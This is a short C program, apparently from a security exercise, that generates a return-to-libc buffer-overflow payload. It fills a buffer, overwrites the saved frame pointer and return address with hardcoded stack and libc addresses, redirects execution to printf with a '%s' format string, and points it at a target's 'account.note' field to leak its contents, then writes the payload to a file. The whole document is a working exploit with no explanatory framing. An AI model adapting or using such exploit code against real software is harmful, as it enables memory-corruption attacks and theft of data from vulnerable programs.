#include <stdio.h>
#include <string.h>

int main() {
  int i;
  unsigned char buf[128]; //must use unsigned char due to sign extension 
  FILE *fp;

  memset(buf ,'a', 128);

  *((unsigned*)(&buf[88])) = 0xffffd588; // old ebp
  *((unsigned*)(&buf[92])) = 0xf7e5ddd0; // address of printf in libc (overwritten to the true ret address)
  *((unsigned*)(&buf[96])) = 0xf7f373d0; // fake ret address after printf is executed (fclose)
  *((unsigned*)(&buf[100])) = 0xffffd43c; // 1st argument of printf (addr of format string)
  *((unsigned*)(&buf[104])) = 0xffffd4cc; // 2nd argument of printf (addr of account.note)
  strncpy(buf+108, "%s\n", 4); // the format string "%s\n"

  fp = fopen("abc", "w");
  fwrite(buf, 1, 128, fp);

  fclose(fp);
}
